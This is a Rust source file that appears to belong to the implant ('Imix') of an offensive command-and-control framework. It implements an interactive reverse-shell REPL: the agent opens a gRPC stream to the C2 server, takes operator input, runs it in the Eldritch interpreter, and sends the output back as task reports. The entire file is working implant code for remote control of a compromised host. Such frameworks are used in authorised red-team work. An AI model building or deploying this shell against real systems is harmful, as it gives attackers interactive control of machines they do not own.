use std::io::{BufWriter, Write};
use std::sync::Arc;

use crate::agent::ImixAgent;
use crossterm::{QueueableCommand, cursor, terminal};
use eldritch::agent::agent::Agent;
use eldritch::assets::std::EmptyAssets;
use eldritch::repl::{Repl, ReplAction};
use eldritch::{Interpreter, Printer, Span, Value};
use pb::c2::{
    ReportOutputRequest, ReportShellTaskOutputMessage, ReportTaskOutputMessage,
    ReverseShellMessageKind, ReverseShellRequest, ShellTaskOutput, TaskError, TaskOutput,
    report_output_request, reverse_shell_request,
};
use transport::Transport;

use eldritch_agent::Context;

use super::parser::InputParser;

struct VtWriter<T: Transport> {
    tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
    context: Context,
    _phantom: std::marker::PhantomData<T>,
}

impl<T: Transport> Write for VtWriter<T> {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        let context_val = match &self.context {
            Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
            Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(
                stc.clone(),
            )),
        };

        let _ = self.tx.blocking_send(ReverseShellRequest {
            context: context_val,
            kind: ReverseShellMessageKind::Data.into(),
            data: buf.to_vec(),
        });
        Ok(buf.len())
    }

    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

// Custom printer that sends output to channels instead of stdout/stderr
#[derive(Debug)]
struct StreamPrinter {
    out_tx: tokio::sync::mpsc::UnboundedSender<String>,
    err_tx: tokio::sync::mpsc::UnboundedSender<String>,
}

impl StreamPrinter {
    fn new(
        out_tx: tokio::sync::mpsc::UnboundedSender<String>,
        err_tx: tokio::sync::mpsc::UnboundedSender<String>,
    ) -> Self {
        Self { out_tx, err_tx }
    }
}

impl Printer for StreamPrinter {
    fn print_out(&self, _span: &Span, s: &str) {
        let _ = self.out_tx.send(format!("{}\n", s));
    }

    fn print_err(&self, _span: &Span, s: &str) {
        let _ = self.err_tx.send(s.to_string());
    }
}

fn render<W: Write>(
    writer: &mut W,
    repl: &Repl,
    previous_buffer: Option<&str>,
) -> std::io::Result<()> {
    // Basic rendering implementation
    // This is simplified and assumes vt100 compatibility on the other end

    // If we have a previous buffer, clear the line
    if let Some(_prev) = previous_buffer {
        writer.queue(terminal::Clear(terminal::ClearType::CurrentLine))?;
        writer.queue(cursor::MoveToColumn(0))?;
    }

    let state = repl.get_render_state();
    let prompt = ">>> ";
    writer.write_all(prompt.as_bytes())?;
    writer.write_all(state.buffer.as_bytes())?;

    // Move cursor to correct position
    let cursor_pos = prompt.len() + state.cursor;
    writer.queue(cursor::MoveToColumn(cursor_pos as u16))?;

    writer.flush()?;
    Ok(())
}

pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
    context: Context,
    mut transport: T,
    agent: ImixAgent<T>,
) -> anyhow::Result<()> {
    // Channels to manage gRPC stream
    let (output_tx, output_rx) = tokio::sync::mpsc::channel(100);
    let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(100);

    #[cfg(debug_assertions)]
    log::info!("starting repl_reverse_shell (context={:?})", context);

    let context_val = match &context {
        Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
        Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(
            stc.clone(),
        )),
    };

    // First, send an initial registration message
    if let Err(_err) = output_tx
        .send(ReverseShellRequest {
            context: context_val.clone(),
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        })
        .await
    {
        #[cfg(debug_assertions)]
        log::error!("failed to send initial registration message: {_err}");
    }

    // Initiate gRPC stream
    if let Err(e) = transport.reverse_shell(output_rx, input_tx).await {
        return Err(e);
    }

    let runtime = tokio::runtime::Handle::current();
    let _ = tokio::task::spawn_blocking(move || {
        let (out_tx, mut out_rx) = tokio::sync::mpsc::unbounded_channel();
        let (err_tx, mut err_rx) = tokio::sync::mpsc::unbounded_channel();
        let printer = Arc::new(StreamPrinter::new(out_tx, err_tx));

        let consumer_output_tx = output_tx.clone();
        let consumer_agent = agent.clone();
        let consumer_context = context.clone();

        runtime.spawn(async move {
            let mut out_open = true;
            let mut err_open = true;

            loop {
                tokio::select! {
                    val = out_rx.recv(), if out_open => {
                        match val {
                            Some(msg) => {
                                // Send to REPL
                                let s_crlf = msg.replace('\n', "\r\n");
                                let context_val = match &consumer_context {
                                    Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
                                    Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(stc.clone())),
                                };
                                let _ = consumer_output_tx
                                    .send(ReverseShellRequest {
                                        context: context_val,
                                        kind: ReverseShellMessageKind::Data.into(),
                                        data: s_crlf.into_bytes(),
                                    })
                                    .await;

                                // Report Task Output
                                let task_error = None;
                                let message_val = match &consumer_context {
                                    Context::Task(tc) => {
                                        let output_msg = TaskOutput {
                                            id: tc.task_id,
                                            output: msg,
                                            error: task_error,
                                            exec_started_at: None,
                                            exec_finished_at: None,
                                        };
                                        Some(report_output_request::Message::TaskOutput(ReportTaskOutputMessage {
                                            context: Some(tc.clone()),
                                            output: Some(output_msg),
                                        }))
                                    },
                                    Context::ShellTask(stc) => {
                                        let output_msg = ShellTaskOutput {
                                            id: stc.shell_task_id,
                                            output: msg,
                                            error: task_error,
                                            exec_started_at: None,
                                            exec_finished_at: None,
                                        };
                                        Some(report_output_request::Message::ShellTaskOutput(ReportShellTaskOutputMessage {
                                            context: Some(stc.clone()),
                                            output: Some(output_msg),
                                        }))
                                    }
                                };

                                let _ = consumer_agent.report_output(ReportOutputRequest {
                                    message: message_val,
                                });
                            }
                            None => {
                                out_open = false;
                            }
                        }
                    }
                    val = err_rx.recv(), if err_open => {
                         match val {
                            Some(msg) => {
                                // Send to REPL
                                let s_crlf = msg.replace('\n', "\r\n");
                                let context_val = match &consumer_context {
                                    Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
                                    Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(stc.clone())),
                                };
                                let _ = consumer_output_tx
                                    .send(ReverseShellRequest {
                                        context: context_val,
                                        kind: ReverseShellMessageKind::Data.into(),
                                        data: s_crlf.into_bytes(),
                                    })
                                    .await;

                                // Report Task Output
                                let task_error = Some(TaskError { msg });
                                let message_val = match &consumer_context {
                                    Context::Task(tc) => {
                                        let output_msg = TaskOutput {
                                            id: tc.task_id,
                                            output: String::new(),
                                            error: task_error,
                                            exec_started_at: None,
                                            exec_finished_at: None,
                                        };
                                        Some(report_output_request::Message::TaskOutput(ReportTaskOutputMessage {
                                            context: Some(tc.clone()),
                                            output: Some(output_msg),
                                        }))
                                    },
                                    Context::ShellTask(stc) => {
                                        let output_msg = ShellTaskOutput {
                                            id: stc.shell_task_id,
                                            output: String::new(),
                                            error: task_error,
                                            exec_started_at: None,
                                            exec_finished_at: None,
                                        };
                                        Some(report_output_request::Message::ShellTaskOutput(ReportShellTaskOutputMessage {
                                            context: Some(stc.clone()),
                                            output: Some(output_msg),
                                        }))
                                    }
                                };

                                let _ = consumer_agent.report_output(ReportOutputRequest {
                                    message: message_val,
                                });
                            }
                            None => {
                                err_open = false;
                            }
                        }
                    }
                }

                if !out_open && !err_open {
                    break;
                }
            }
        });

        let backend = Arc::new(EmptyAssets {});
        let mut interpreter = Interpreter::new_with_printer(printer)
            .with_default_libs()
            .with_context(Arc::new(agent), context.clone(), Vec::new(), backend); // Changed to with_context

        let mut repl = Repl::new();
        let stdout = VtWriter::<T> {
            tx: output_tx.clone(),
            context: context.clone(),
            _phantom: std::marker::PhantomData,
        };
        let mut stdout = BufWriter::new(stdout);

        let _ = render(&mut stdout, &repl, None);

        // State machine for VT100 parsing
        let mut parser = InputParser::new();
        let mut previous_buffer = String::new();

        while let Some(msg) = input_rx.blocking_recv() {
            if msg.kind == ReverseShellMessageKind::Ping as i32 {
                let context_val = match &context {
                    Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
                    Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(stc.clone())),
                };
                let _ = output_tx.blocking_send(ReverseShellRequest {
                    context: context_val,
                    kind: ReverseShellMessageKind::Ping.into(),
                    data: msg.data,
                });
                continue;
            }
            if msg.data.is_empty() {
                continue;
            }

            // Parse input
            let inputs = parser.parse(&msg.data);
            let mut pending_render = false;

            for (i, input) in inputs.iter().enumerate() {
                #[cfg(debug_assertions)]
                log::info!("Handling input: {input:?}");
                let action = repl.handle_input(input.clone());
                match action {
                    ReplAction::Render => {
                        pending_render = true;
                    }
                    other => {
                        // If we have a pending render from previous inputs, do it now
                        // before processing a non-render action (like Submit) which relies on visual state.
                        if pending_render {
                            let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                            // Update previous_buffer after render
                            previous_buffer = repl.get_render_state().buffer;
                            pending_render = false;
                        }

                        match other {
                            ReplAction::Quit => return,
                            ReplAction::Submit { code, .. } => {
                                // Move to next line
                                let _ = stdout.write_all(b"\r\n");
                                let _ = stdout.flush();

                                // Execute
                                match interpreter.interpret(&code) {
                                    Ok(v) => {
                                        if !matches!(v, Value::None) {
                                            let s = format!("{v:?}\r\n");
                                            let _ = stdout.write(s.as_bytes());
                                        }
                                    }
                                    Err(e) => {
                                        let s = format!("Error: {e}");
                                        let s_crlf = s.replace('\n', "\r\n");
                                        let final_s = format!("{s_crlf}\r\n");
                                        let _ = stdout.write(final_s.as_bytes());
                                    }
                                }
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer.clear(); // Reset after submit
                            }
                            ReplAction::AcceptLine { .. } => {
                                let _ = stdout.write_all(b"\r\n");
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer.clear(); // Buffer is cleared in repl too
                            }
                            ReplAction::ClearScreen => {
                                let _ = stdout.queue(terminal::Clear(terminal::ClearType::All));
                                let _ = stdout.queue(cursor::MoveTo(0, 0));
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer = repl.get_render_state().buffer;
                            }
                            ReplAction::Complete => {
                                let state = repl.get_render_state();
                                let (start, completions) =
                                    interpreter.complete(&state.buffer, state.cursor);
                                repl.set_suggestions(completions, start);
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer = repl.get_render_state().buffer;
                            }
                            ReplAction::None => {}
                            ReplAction::Render => unreachable!(),
                        }
                    }
                }

                // If this is the last input and we have a pending render, flush it.
                if i == inputs.len() - 1 && pending_render {
                    let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                    previous_buffer = repl.get_render_state().buffer;
                    pending_render = false;
                }
            }
        }
    })
    .await;
    Ok(())
}
